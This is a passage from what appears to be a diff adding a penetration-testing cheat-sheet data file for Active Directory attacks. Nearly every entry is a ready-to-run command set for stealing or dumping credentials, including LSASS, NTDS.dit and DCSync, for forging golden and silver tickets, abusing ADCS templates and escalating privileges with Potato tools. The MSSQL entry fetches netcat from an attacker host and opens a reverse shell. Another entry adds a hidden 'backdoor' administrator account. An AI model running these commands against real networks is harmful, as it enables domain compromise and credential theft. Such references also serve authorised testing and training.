+# SharpHound from Windows (more complete — includes local sessions)
+SharpHound.exe -c All --zipfilename bloodhound.zip
+SharpHound.exe -c All,GPOLocalGroup --stealth
+
+# Start BloodHound
+sudo neo4j start
+bloodhound &
+# Import the zip, then use pre-built queries
+
+# Key built-in queries:
+# Find Shortest Paths to Domain Admins
+# Find Principals with DCSync Rights
+# Computers with Unconstrained Delegation
+# Find AS-REP Roastable Users
+# Find Kerberoastable Users with DA path
+# Users with Most Sessions (where are DAs logged in?)
+
+# Mark your user as Owned → Shortest Paths from Owned Principals`,
+    ref: 'https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/'
+  },
+  {
+    title: 'Kerberoasting',
+    req: 'Any valid domain credentials',
+    gets: 'TGS ticket hashes for service accounts — crack offline',
+    tags: ['have-username','have-password','proto-kerberos','cat-dump'],
+    cmd: `# List accounts with SPNs (service accounts)
+impacket-GetUserSPNs -dc-ip <DC-IP> '<domain>/<user>:<pass>'
+
+# Request the hashed TGS tickets
+impacket-GetUserSPNs -dc-ip <DC-IP> '<domain>/<user>:<pass>' -request
+impacket-GetUserSPNs -dc-ip <DC-IP> '<domain>/<user>:<pass>' -request -outputfile kerberoast.txt
+
+# Crack (RC4 = hashcat mode 13100, AES128 = 19600, AES256 = 19700)
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+# From Windows (Rubeus)
+Rubeus.exe kerberoast /outfile:hashes.txt
+
+# PowerView — list SPN accounts
+Get-DomainUser -SPN | select samaccountname, description, serviceprincipalname`,
+    note: 'Service accounts are often over-privileged and have weak/old passwords. If a service account is DA → instant win.',
+    ref: 'https://tools.thehacker.recipes/impacket/examples/getuserspns.py'
+  },
+  {
+    title: 'AS-REP Roasting — With Valid Creds',
+    req: 'Valid domain credentials (auto-checks all users)',
+    gets: 'Crackable TGT hashes for users with pre-auth disabled',
+    tags: ['have-username','have-password','proto-kerberos','cat-dump'],
+    cmd: `# With creds — automatically checks ALL domain users
+impacket-GetNPUsers -request -format hashcat -dc-ip <DC-IP> '<domain>/<user>:<pass>'
+impacket-GetNPUsers -request -format hashcat -dc-ip <DC-IP> '<domain>/<user>:<pass>' -outputfile asrep.txt
+
+# Crack
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+
+# From Windows (Rubeus)
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt`
+  },
+  {
+    title: 'SMB Share Enumeration + Spider',
+    req: 'Valid domain credentials',
+    gets: 'Share list, readable files, credentials in config/script files',
+    tags: ['have-username','have-password','proto-smb','cat-enum'],
+    cmd: `# List all shares across subnet
+crackmapexec smb <subnet>/24 -u <user> -p <pass> --shares
+smbclient -L //<IP> -U '<domain>/<user>%<pass>'
+
+# Spider shares for credential files (.xml, .ps1, .ini, web.config, passwords.txt)
+crackmapexec smb <IP> -u <user> -p <pass> -M spider_plus
+
+# Snaffler — hunts all accessible shares automatically
+Snaffler.exe -s -o snaffler_out.log
+
+# Recursive manual listing
+smbmap -H <IP> -u <user> -p <pass> -R
+
+# Browse and download files
+smbclient //<IP>/<ShareName> -U '<domain>/<user>%<pass>'
+smb: \\> dir
+smb: \\> get "Notice from HR.txt"`,
+    note: 'HR, DEV, IT, Accounting, Backup shares = high value. Look for: .ps1, .bat, .xml, .ini, web.config, sql-Configuration.INI'
+  },
+  {
+    title: 'GPP Passwords — SYSVOL Creds',
+    req: 'Valid domain credentials (read access to SYSVOL)',
+    gets: 'Plaintext passwords from Group Policy Preferences XML files',
+    tags: ['have-username','have-password','proto-smb','cat-dump'],
+    cmd: `# CME module (automatic)
+crackmapexec smb <DC-IP> -u <user> -p <pass> -M gpp_password
+
+# Manual — browse SYSVOL for Groups.xml
+smbclient //<DC-IP>/SYSVOL -U '<domain>/<user>%<pass>'
+# Find files named: Groups.xml, Services.xml, ScheduledTasks.xml, Printers.xml
+# Look for: cPassword field — encrypted with publicly known AES key
+
+# Decrypt cPassword manually
+python3 -c "import base64,hashlib,pyaes; ..."
+# OR use gpp-decrypt tool:
+gpp-decrypt '<cPassword-value>'`,
+    note: 'GPP passwords are encrypted with a key Microsoft published in 2012 (MS14-025). Any cPassword value can be decrypted.'
+  },
+  {
+    title: 'Passwords in AD Description Fields',
+    req: 'Valid domain credentials',
+    gets: 'Plaintext passwords stored by admins in user description fields',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `# CME LDAP module
+crackmapexec ldap <DC-IP> -u <user> -p <pass> -M get-desc-users
+
+# CME SMB (lists all users with descriptions)
+crackmapexec smb <DC-IP> -u <user> -p <pass> --users
+
+# PowerView
+Get-DomainUser | Where-Object {$_.description -ne $null} | select samaccountname,description
+
+# Example find:
+# cicada.htb\\david.orelious  desc: Just in case I forget my password is aRt$Lp#7t*VQ!3`,
+    note: 'Surprisingly common. Helpdesk admins set default passwords and store them in the description "just in case".'
+  },
+  {
+    title: 'windapsearch — Targeted LDAP Queries',
+    req: 'Valid domain credentials, LDAP access',
+    gets: 'Users, groups, computers, privileged accounts',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `python3 windapsearch.py -d <domain> -u <user> -p <pass> --dc-ip <DC-IP> -U     # all users
+python3 windapsearch.py -d <domain> -u <user> -p <pass> --dc-ip <DC-IP> -G     # all groups
+python3 windapsearch.py -d <domain> -u <user> -p <pass> --dc-ip <DC-IP> -C     # all computers
+python3 windapsearch.py -d <domain> -u <user> -p <pass> --dc-ip <DC-IP> --da   # DA members
+python3 windapsearch.py -d <domain> -u <user> -p <pass> --dc-ip <DC-IP> -PU    # privileged users
+python3 windapsearch.py -d <domain> -u <user> -p <pass> --dc-ip <DC-IP> --custom "objectClass=*"`
+  },
+  {
+    title: 'PowerView — AD Enumeration',
+    req: 'Valid domain credentials, PowerShell execution (on Windows)',
+    gets: 'Deep AD enumeration: ACLs, GPOs, delegation, sessions, group memberships',
+    tags: ['have-username','have-password','proto-ldap','cat-enum'],
+    cmd: `# Load (bypass execution policy)
+Import-Module .\\PowerView.ps1
+# OR: powershell -ep bypass -c "Import-Module .\\PowerView.ps1; Get-Domain"
+
+# Domain info
+Get-Domain; Get-DomainController
+
+# Users
+Get-DomainUser | select samaccountname,description,memberof
+Get-DomainUser -SPN                                  # Kerberoastable users
+Get-DomainUser | Where {$_.useraccountcontrol -band 4194304}  # preauth disabled
+
+# Groups
+Get-DomainGroup | select name
+Get-DomainGroupMember "Domain Admins"
+
+# Computers
+Get-DomainComputer | select dnshostname,operatingsystem
+Get-DomainComputer -Unconstrained        # unconstrained delegation (high value!)
+Get-DomainComputer -TrustedToAuth        # constrained delegation
+
+# ACLs — find misconfigurations
+Get-DomainObjectAcl -Identity <user> -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs  # all non-default ACLs (slow but thorough)
+
+# GPOs
+Get-DomainGPOComputerLocalGroupMapping   # who gets local admin via GPO?
+
+# Sessions (who is logged in where)
+Get-NetLoggedon -ComputerName <host>
+Get-NetSession -ComputerName <DC>`,
+    ref: 'https://trustedsec.com/blog/active-directory-for-script-kiddies'
+  },
+  {
+    title: 'ACL Abuse — GenericAll / GenericWrite / WriteDACL',
+    req: 'Valid domain credentials + an ACL right on a target object (BloodHound will highlight)',
+    gets: 'Password reset, SPN add, group membership, DCSync rights',
+    tags: ['have-username','have-password','proto-ldap','cat-privesc'],
+    cmd: `# Check ACLs via PowerView
+Get-DomainObjectAcl -Identity <target> -ResolveGUIDs | Where {$_.ActiveDirectoryRights -match "GenericAll"}
+Find-InterestingDomainAcl -ResolveGUIDs
+
+# GenericAll on USER → reset password
+$pass = ConvertTo-SecureString "NewPass123!" -AsPlainText -Force
+Set-DomainUserPassword -Identity <target-user> -AccountPassword $pass
+
+# GenericAll on USER → add SPN → Kerberoast them
+Set-DomainObject -Identity <target-user> -Set @{serviceprincipalname="fake/spn"}
+impacket-GetUserSPNs -dc-ip <DC-IP> '<domain>/<user>:<pass>' -request
+
+# GenericAll on GROUP → add yourself
+Add-DomainGroupMember -Identity <group> -Members <youruser>
+
+# WriteDACL on DOMAIN → grant DCSync rights
+Import-Module .\\PowerView.ps1
+$cred = New-Object System.Management.Automation.PSCredential('<domain>\\<user>', (ConvertTo-SecureString '<pass>' -AsPlainText -Force))
+Add-ObjectACL -PrincipalIdentity <youruser> -Credential $cred -Rights DCSync
+
+# WriteOwner → take ownership → then GenericAll
+Set-DomainObjectOwner -Identity <target> -OwnerIdentity <youruser>
+Add-DomainObjectAcl -TargetIdentity <target> -Rights ResetPassword -PrincipalIdentity <youruser>`,
+    note: 'Use BloodHound "Shortest Path from Owned Principals" to discover which ACL rights you have.'
+  },
+  {
+    title: 'Certipy — Enumerate ADCS Vulnerabilities',
+    req: 'Valid domain credentials, ADCS running in domain',
+    gets: 'List of ESC misconfigurations in certificate templates',
+    tags: ['have-username','have-password','proto-ldap','cat-adcs','cat-enum'],
+    cmd: `# Find all vulnerable templates (ESC1–ESC8)
+certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC-IP> -vulnerable -stdout
+
+# ESC quick reference:
+# ESC1: enrollee supplies SAN + client auth EKU → request cert as any user (DA)
+# ESC2: template for any purpose → use as ESC3
+# ESC3: Certificate Request Agent EKU → request certs on behalf of others
+# ESC4: you have write perms on template → modify template → ESC1
+# ESC8: NTLM relay to AD CS HTTP enrollment → relay DC hash → get cert`,
+    ref: 'https://github.com/ly4k/Certipy'
+  },
+  {
+    title: 'Certipy — ESC1 Attack (Request Cert as DA)',
+    req: 'Valid domain creds + ESC1-vulnerable certificate template',
+    gets: 'NT hash of Administrator (or any user)',
+    tags: ['have-username','have-password','have-adcs','cat-adcs','cat-privesc'],
+    cmd: `# Step 1: Find vulnerable template (from Certipy enumerate output)
+# ESC1 conditions: enrollee supplies subject + Client Authentication EKU
+
+# Step 2: Request certificate as Administrator
+certipy req -u '<user>@<domain>' -p '<pass>' \\
+  -ca '<CA-name>' -template '<template>' \\
+  -upn 'administrator@<domain>' -dc-ip <DC-IP>
+
+# Step 3: Authenticate with cert → get NT hash
+certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
+
+# Step 4: Pass-the-Hash
+evil-winrm -i <DC-IP> -u Administrator -H <NT-hash>
+impacket-psexec '<domain>/Administrator@<DC-IP>' -hashes :<NT-hash>`
+  },
+  {
+    title: 'Certipy — ESC4 → ESC1 (Modify Template)',
+    req: 'Write permissions on a certificate template (Cert Publishers or WriteProperty)',
+    gets: 'Ability to request certs as any user including DA',
+    tags: ['have-username','have-password','have-adcs','cat-adcs','cat-privesc'],
+    cmd: `# Step 1: Enumerate to confirm ESC4
+certipy find -u '<user>@<domain>' -p '<pass>' -dc-ip <DC-IP> -vulnerable -stdout
+
+# Step 2: Modify template to enable ESC1 (saves original config)
+certipy template -u '<user>@<domain>' -p '<pass>' -template <TemplateName> -save-old -dc-ip <DC-IP>
+
+# Step 3: Request cert as Administrator
+certipy req -u '<user>@<domain>' -p '<pass>' \\
+  -ca '<CA-name>' -template <TemplateName> \\
+  -target <DC-hostname> -upn administrator@<domain>
+
+# Step 4: Authenticate → NT hash
+certipy auth -pfx administrator.pfx -domain <domain>
+
+# Step 5 (cleanup): Restore original template config
+certipy template -u '<user>@<domain>' -p '<pass>' -template <TemplateName> -configuration <saved.json>`
+  },
+  {
+    title: 'Check Logged-in Sessions — Find High-Value Targets',
+    req: 'Valid domain credentials',
+    gets: 'Which machines have DA/privileged users logged in (LSASS targets)',
+    tags: ['have-username','have-password','proto-smb','cat-enum'],
+    cmd: `# Who is currently logged in on a machine?
+crackmapexec smb <IP> -u <user> -p <pass> --sessions
+crackmapexec smb <IP> -u <user> -p <pass> --loggedon-users
+
+# Sweep whole subnet for sessions
+crackmapexec smb <subnet>/24 -u <user> -p <pass> --loggedon-users
+
+# PowerView
+Get-NetLoggedon -ComputerName <host>
+Get-NetSession -ComputerName <DC>
+
+# BloodHound query: "Users with Most Sessions" shows where DAs are logged in`,
+    note: 'If a Domain Admin is logged into a machine where you have local admin → dump LSASS on that machine to get DA hash.'
+  },
+  {
+    title: 'Dump SAM — Local Account NTLM Hashes',
+    req: 'Local admin on target',
+    gets: 'NTLM hashes for all local accounts → crack or pass-the-hash',
+    tags: ['have-localadmin','proto-smb','cat-dump'],
+    cmd: `# Remote (CME + impacket)
+crackmapexec smb <IP> -u <user> -p <pass> --sam
+impacket-secretsdump <domain>/<user>:<pass>@<IP>
+
+# Local (from cmd.exe on target)
+reg save HKLM\\SAM sam.hive
+reg save HKLM\\SYSTEM system.hive
+# Download files, then:
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL`,
+    note: 'What you get: Administrator:500:aad3...:NTLM_HASH:::  → Use the right-side hash (after last colon before :::) for PTH.',
+    ref: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets'
+  },
+  {
+    title: 'Dump LSA Secrets — Cached Domain Creds',
+    req: 'Local admin on target',
+    gets: 'Service account plaintext passwords, cached domain creds, machine account hash',
+    tags: ['have-localadmin','proto-smb','cat-dump'],
+    cmd: `# Remote
+crackmapexec smb <IP> -u <user> -p <pass> --lsa
+impacket-secretsdump <domain>/<user>:<pass>@<IP>
+
+# Local
+reg save HKLM\\SECURITY security.hive
+reg save HKLM\\SYSTEM system.hive
+impacket-secretsdump -security security.hive -system system.hive LOCAL
+
+# Crack DCC2/MSCache2 hashes
+hashcat -m 2100 dcc2_hashes.txt /usr/share/wordlists/rockyou.txt`,
+    note: 'LSA often contains: service account plaintext passwords, cached domain creds (DCC2 hashes — slow to crack), machine account hash.'
+  },
+  {
+    title: 'Dump LSASS — Active Session Credentials',
+    req: 'Local admin + SeDebugPrivilege (or SYSTEM)',
+    gets: 'NTLM hashes, possibly cleartext passwords, Kerberos tickets for all logged-in users',
+    tags: ['have-localadmin','cat-dump'],
+    cmd: `# Option 1: ProcDump (signed MS binary — less flagged by AV)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# Parse offline on attacker:
+pypykatz lsa minidump lsass.dmp
+
+# Option 2: Task Manager → Details tab → lsass.exe → "Create dump file"
+
+# Option 3: CME
+crackmapexec smb <IP> -u <user> -p <pass> -M lsassy
+
+# Option 4: Mimikatz (noisy — likely flagged)
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+
+# Option 5: Mimikatz on offline dump (on attacker machine)
+# sekurlsa::minidump lsass.dmp
+# sekurlsa::logonpasswords`,
+    warn: 'Direct mimikatz on target = very high AV detection. ProcDump or Task Manager dump → offline parsing is stealthier.'
+  },
+  {
+    title: 'Pass-the-Hash (PTH)',
+    req: 'NTLM hash of a local admin or domain account',
+    gets: 'Shell / lateral movement without knowing the plaintext password',
+    tags: ['have-hash','proto-smb','proto-winrm','cat-lateral'],
+    cmd: `# Check which machines the hash works on
+crackmapexec smb <subnet>/24 -u Administrator -H <NTLM-hash>
+crackmapexec smb <subnet>/24 -u Administrator -H <NTLM-hash> --local-auth  # local account
+
+# Get a shell
+impacket-psexec '<domain>/Administrator@<IP>' -hashes :<NTLM-hash>
+impacket-wmiexec '<domain>/Administrator@<IP>' -hashes :<NTLM-hash>
+impacket-smbexec '<domain>/Administrator@<IP>' -hashes :<NTLM-hash>
+
+# Evil-WinRM (WinRM must be open)
+evil-winrm -i <IP> -u Administrator -H <NTLM-hash>
+
+# RDP with PTH (requires RestrictedAdmin mode on target)
+xfreerdp /u:Administrator /pth:<NTLM-hash> /v:<IP> /cert:ignore`,
+    warn: 'PTH works ONLY with NTLM hashes. Net-NTLMv2 (Responder captures) CANNOT be passed — they must be cracked or relayed.'
+  },
+  {
+    title: 'Pass-the-Ticket (PTT)',
+    req: 'Kerberos TGT or TGS (.ccache file)',
+    gets: 'Lateral movement using stolen Kerberos tickets',
+    tags: ['have-hash','proto-kerberos','cat-lateral'],
+    cmd: `# Export tickets from LSASS (mimikatz, on victim with debug rights)
+mimikatz "sekurlsa::tickets /export"
+# Saves .kirbi files
+
+# Import ticket (mimikatz)
+mimikatz "kerberos::ptt <ticket.kirbi>"
+
+# Use with impacket (Linux)
+export KRB5CCNAME=<ticket.ccache>
+impacket-psexec -k -no-pass <domain>/<user>@<target>
+impacket-wmiexec -k -no-pass <domain>/<user>@<target>
+
+# Rubeus — harvest TGTs from LSASS
+Rubeus.exe harvest /interval:30
+
+# Rubeus — overpass-the-hash (NTLM → TGT)
+Rubeus.exe asktgt /user:<user> /rc4:<NTLM-hash> /ptt
+
+# Rubeus — monitor for specific user login then steal TGT
+Rubeus.exe monitor /interval:5 /filteruser:DA_username`,
+    note: 'Access the target by HOSTNAME not IP — Kerberos requires DNS resolution. IP will fall back to NTLM.'
+  },
+  {
+    title: 'SeBackupPrivilege — Read Any File',
+    req: 'SeBackupPrivilege enabled (Backup Operators group, or direct priv)',
+    gets: 'SAM + SYSTEM hives → all local NTLM hashes',
+    tags: ['have-localadmin','proto-smb','cat-dump','cat-privesc'],
+    cmd: `# Verify privilege (on victim)
+whoami /priv
+# Look for: SeBackupPrivilege = Enabled
+
+# Save registry hives (bypasses ACL due to SeBackupPrivilege)
+reg save HKLM\\SAM sam
+reg save HKLM\\SYSTEM system
+
+# Download from evil-winrm session
+*Evil-WinRM*> download sam
+*Evil-WinRM*> download system
+
+# Parse offline on attacker
+impacket-secretsdump -sam sam -system system LOCAL
+# Returns: Administrator:500:aad3...:NTLM_HASH:::
+
+# PTH to get shell
+evil-winrm -u Administrator -H <NTLM-hash> -i <IP>
+
+# Also: copy NTDS.dit using wbadmin or diskshadow (DC access)
+# diskshadow.exe + robocopy to extract NTDS.dit without lock issues`
+  },
+  {
+    title: 'Potato Attacks — SeImpersonatePrivilege to SYSTEM',
+    req: 'SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common on service accounts)',
+    gets: 'SYSTEM shell',
+    tags: ['have-localadmin','cat-privesc'],
+    cmd: `# Verify privilege
+whoami /priv
+# SeImpersonatePrivilege = Enabled → Potato attack
+
+# Windows Server 2019 / 2022
+PrintSpoofer.exe -i -c cmd
+PrintSpoofer.exe -i -c powershell
+
+# Older systems (2016 / Win 10)
+JuicyPotato.exe -l 1337 -p cmd.exe -t *
+
+# Universal (works on all modern Windows)
+GodPotato.exe -cmd "cmd /c whoami"
+GodPotato.exe -cmd "cmd /c net user backdoor P@ss123 /add && net localgroup administrators backdoor /add"
+
+# SweetPotato
+SweetPotato.exe -p cmd.exe`,
+    note: 'SeImpersonatePrivilege is set by default on IIS application pools, SQL Server service accounts, and other service accounts. Very common finding.'
+  },
+  {
+    title: 'WinPEAS — Windows Privilege Escalation Check',
+    req: 'Shell on Windows target (any privilege level)',
+    gets: 'AutoLogon creds, weak services, AlwaysInstallElevated, saved creds, AV status, and more',
+    tags: ['have-localadmin','cat-privesc','cat-enum'],
+    cmd: `# Upload via evil-winrm
+*Evil-WinRM*> upload winPEASx64.exe
+
+# Run
+.\\winPEASx64.exe
+.\\winPEASx64.exe quiet           # less output
+.\\winPEASx64.exe systeminfo userinfo
+
+# Key things WinPEAS finds:
+# AutoLogon credentials in registry (plaintext!)
+#   HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
+#   DefaultUserName, DefaultPassword
+
+# Manual AutoLogon check
+reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
+
+# AlwaysInstallElevated
+reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
+reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated`,
+    note: 'AutoLogon credentials in registry = plaintext password for a service or admin account. Very common in HTB/CTF environments.'
+  },
+  {
+    title: 'Pass-the-Hash Spray — Local Admin Reuse',
+    req: 'NTLM hash of a local admin account',
+    gets: 'Find all machines with the same local admin password (very common)',
+    tags: ['have-hash','proto-smb','cat-lateral','cat-spray'],
+    cmd: `# Same local admin hash often reused across all machines (imaged from same base)
+crackmapexec smb <subnet>/24 -u Administrator -H <NTLM-hash> --local-auth
+
+# (Pwn3d!) = confirmed local admin there too
+# Collect all (Pwn3d!) IPs and pivot to each
+
+# Also try other local admin account names
+crackmapexec smb <subnet>/24 -u <local-admin-name> -H <NTLM-hash> --local-auth`
+  },
+  {
+    title: 'Connect — Evil-WinRM (WinRM Port 5985)',
+    req: 'Local admin or Remote Management Users group membership, WinRM enabled',
+    gets: 'Interactive PowerShell session',
+    tags: ['have-password','have-hash','proto-winrm','cat-lateral'],
+    cmd: `# With password
+evil-winrm -i <IP> -u <user> -p <pass>
+
+# With NTLM hash (pass-the-hash)
+evil-winrm -i <IP> -u <user> -H <NTLM-hash>
+
+# HTTPS (port 5986)
+evil-winrm -i <IP> -u <user> -p <pass> -S
+
+# Upload / download files in session
+upload /local/path/tool.exe C:\\Windows\\Temp\\tool.exe
+download C:\\Windows\\Temp\\out.txt /local/out.txt
+
+# Load PowerShell scripts directly into memory
+evil-winrm -i <IP> -u <user> -p <pass> -s /path/to/scripts/
+
+# Run command and exit
+evil-winrm -i <IP> -u <user> -p <pass> -e /path/to/exes/`,
+    note: 'WinRM must be enabled on target. Check: crackmapexec winrm <IP> -u <user> -p <pass> → (Pwn3d!) = can connect.'
+  },
+  {
+    title: 'Connect — psexec / wmiexec / smbexec',
+    req: 'Local admin on target via SMB port 445',
+    gets: 'Shell on target (SYSTEM for psexec/smbexec, user-level for wmiexec)',
+    tags: ['have-password','have-hash','proto-smb','cat-lateral'],
+    cmd: `# psexec → SYSTEM shell (uploads service binary to ADMIN$)
+impacket-psexec '<domain>/<user>:<pass>@<IP>'
+impacket-psexec '<domain>/<user>@<IP>' -hashes :<NTLM-hash>
+
+# wmiexec → user-level shell, quieter (no service creation)
+impacket-wmiexec '<domain>/<user>:<pass>@<IP>'
+impacket-wmiexec '<domain>/<user>@<IP>' -hashes :<NTLM-hash>
+impacket-wmiexec '<domain>/<user>:<pass>@<IP>' -silentcommand  # no output file on disk
+
+# smbexec → SYSTEM shell, no binary on disk (service per command)
+impacket-smbexec '<domain>/<user>:<pass>@<IP>'
+
+# atexec → single command via Task Scheduler
+impacket-atexec '<domain>/<user>:<pass>@<IP>' "whoami"
+
+# CME one-liner command execution
+crackmapexec smb <IP> -u <user> -p <pass> -x "whoami"       # cmd.exe
+crackmapexec smb <IP> -u <user> -p <pass> -X "whoami"       # PowerShell`,
+    note: 'psexec/smbexec = high noise (Event ID 7045 service creation). wmiexec = medium noise. Choose based on stealth requirements.'
+  },
+  {
+    title: 'Connect — RDP (Port 3389)',
+    req: 'Local admin or Remote Desktop Users group, RDP enabled',
+    gets: 'Full GUI desktop session (no UAC filtering — full token)',
+    tags: ['have-password','have-hash','proto-rdp','cat-lateral'],
+    cmd: `# xfreerdp (Linux)
+xfreerdp /u:<user> /p:<pass> /v:<IP>
+xfreerdp /u:<user> /p:<pass> /v:<IP> /d:<domain>
+xfreerdp /u:<user> /p:<pass> /v:<IP> /dynamic-resolution /drive:share,/tmp
+
+# Pass-the-hash via RDP (requires Restricted Admin mode enabled on target)
+xfreerdp /u:Administrator /pth:<NTLM-hash> /v:<IP> /cert:ignore +auth:force_ntlm
+
+# Enable Restricted Admin mode on target (if you have another shell)
+reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
+
+# Check if RDP is enabled
+nmap -p 3389 --script rdp-enum-encryption <IP>
+crackmapexec rdp <IP> -u <user> -p <pass>`,
+    note: 'UAC does NOT apply to RDP (interactive logon). Local admin via RDP = full token always.'
+  },
+  {
+    title: 'Connect — MSSQL + xp_cmdshell',
+    req: 'MSSQL port 1433, SA account or sysadmin role',
+    gets: 'OS command execution as SQL Server service account (often SYSTEM)',
+    tags: ['have-password','proto-mssql','cat-lateral'],
+    cmd: `# Test access
+crackmapexec mssql <IP> -u sa -p '<pass>'
+nxc mssql <IP> -u sa -p '<pass>' --local-auth
+# (Pwn3d!) = sysadmin confirmed
+
+# Connect
+impacket-mssqlclient '<domain>/<user>:<pass>@<IP>'
+impacket-mssqlclient 'sa:<pass>@<IP>' -windows-auth
+
+# Inside mssqlclient — enable OS command execution
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+
+# Get reverse shell
+# (Start listener: nc -lnvp 4444 on attacker)
+SQL> EXEC xp_cmdshell 'certutil -urlcache -split -f http://<attacker-IP>/nc64.exe C:\\Users\\Public\\nc64.exe'
+SQL> EXEC xp_cmdshell 'C:\\Users\\Public\\nc64.exe -e cmd.exe <attacker-IP> 4444'
+
+# Check SQL install config for plaintext SA password
+type C:\\SQL2019\\ExpressAdv_ENU\\sql-Configuration.INI
+# Look for: SAPWD= and SQLSVCPASSWORD=
+
+# Check linked servers (chain execution to other SQL hosts)
+SQL> SELECT * FROM sys.servers;
+SQL> EXEC ('xp_cmdshell ''whoami''') AT [linked-server]`,
+    note: 'SQL Server service often runs as NT AUTHORITY\\SYSTEM or a high-privilege domain service account.'
+  },
+  {
+    title: 'Connect — SSH (Port 22)',
+    req: 'OpenSSH server installed, valid credentials',
+    gets: 'Shell session (full token for admins — no UAC filtering)',
+    tags: ['have-password','proto-ssh','cat-lateral'],
+    cmd: `# Check if OpenSSH is running
+nxc ssh <subnet>/24
+
+# Connect
+ssh <user>@<IP>
+ssh <domain>\\<user>@<IP>
+ssh <user>@<IP> -i id_rsa       # with key
+
+# Admin note: Administrators use administrators_authorized_keys
+# Non-admins use standard ~/.ssh/authorized_keys`
+  },
+  {
+    title: 'DCSync — Dump All Domain Hashes',
+    req: 'DCSync rights: Domain Admin, Enterprise Admin, or DS-Replication-Get-Changes-All',
+    gets: 'NTLM hashes for all (or specific) domain accounts including krbtgt',
+    tags: ['have-domainadmin','proto-ldap','cat-dump'],
+    cmd: `# Dump a specific user
+impacket-secretsdump -just-dc-user krbtgt '<domain>/<user>:<pass>@<DC-IP>'
+impacket-secretsdump -just-dc-user Administrator '<domain>/<user>:<pass>@<DC-IP>'
+
+# Dump ALL domain hashes
+impacket-secretsdump '<domain>/<user>:<pass>@<DC-IP>'
+impacket-secretsdump -just-dc '<domain>/<user>:<pass>@<DC-IP>'  # NTLM only, faster
+
+# With hash instead of password
+impacket-secretsdump '<domain>/<user>@<DC-IP>' -hashes :<NTLM-hash>
+
+# Mimikatz (if on DC or with DCSync rights)
+mimikatz "lsadump::dcsync /domain:<domain> /all /csv" exit
+mimikatz "lsadump::dcsync /domain:<domain> /user:krbtgt" exit`,
+    note: 'Does NOT require being on the DC — works remotely from attacker machine. BloodHound shows non-obvious principals with DCSync rights.',
+    ref: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds'
+  },
+  {
+    title: 'NTDS.dit — Physical Domain Hash Dump',
+    req: 'Domain Admin or Backup Operators + DC filesystem access',
+    gets: 'All domain NTLM hashes offline from the AD database file',
+    tags: ['have-domainadmin','cat-dump'],
+    cmd: `# Method 1: impacket (does VSS automatically)
+impacket-secretsdump '<domain>/<user>:<pass>@<DC-IP>' -just-dc
+
+# Method 2: Volume Shadow Copy (manual, no file lock issues)
+vssadmin create shadow /for=C:
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\ntds.dit
+copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\system.hive
+# Parse offline:
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+
+# Method 3: wbadmin (Backup Operators path)
+wbadmin start backup -backuptarget:\\\\<attacker-IP>\\share -include:c:\\windows\\ntds
+wbadmin get versions
+wbadmin start recovery -version:<ver> -itemtype:file -items:c:\\windows\\ntds\\ntds.dit -recoverytarget:C:\\ -notrestoreacl`,
+    ref: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds'
+  },
+  {
+    title: 'Golden Ticket — Forge Any TGT',
+    req: 'krbtgt NTLM hash + Domain SID (from DCSync)',
+    gets: 'Persistent DA access — impersonate any user for up to 10 years',
+    tags: ['have-domainadmin','proto-kerberos','cat-persist'],
+    cmd: `# Get Domain SID
+impacket-lookupsid '<domain>/<user>:<pass>@<DC-IP>'
+
+# Create Golden Ticket (mimikatz — inject directly into session)
+mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain-SID> /krbtgt:<krbtgt-hash> /ptt" exit
+
+# Create Golden Ticket + save to file (impacket)
+impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain <domain> Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass <domain>/Administrator@<DC-hostname>`,
+    warn: 'Access the DC by HOSTNAME not IP — Kerberos requires DNS resolution. To fully invalidate a Golden Ticket, the krbtgt password must be reset TWICE.'
+  },
+  {
+    title: 'Silver Ticket — Forge Service TGS',
+    req: 'Service account NTLM hash + Domain SID + SPN',
+    gets: 'Access to that specific service without touching the DC (stealth)',
+    tags: ['have-domainadmin','proto-kerberos','cat-lateral','cat-persist'],
+    cmd: `# Forge TGS for a specific service
+impacket-ticketer -nthash <service-account-hash> -domain-sid <SID> -domain <domain> -spn <SPN/host> Administrator
+# Example SPN: cifs/fileserver.domain.local  or  http/webserver.domain.local
+
+# Use the ticket
+export KRB5CCNAME=Administrator.ccache
+impacket-smbclient -k -no-pass <domain>/Administrator@<service-host>
+
+# Mimikatz
+mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<SID> /target:<service-host> /service:cifs /rc4:<hash> /ptt" exit`,
+    note: 'Stealthier than Golden Ticket — never touches the DC during use. Requires the specific service account hash.'
+  },
+  {
+    title: 'Account Operators → Exchange WP → DCSync',
+    req: 'Account Operators group membership (check BloodHound)',
+    gets: 'DCSync rights → all domain hashes',
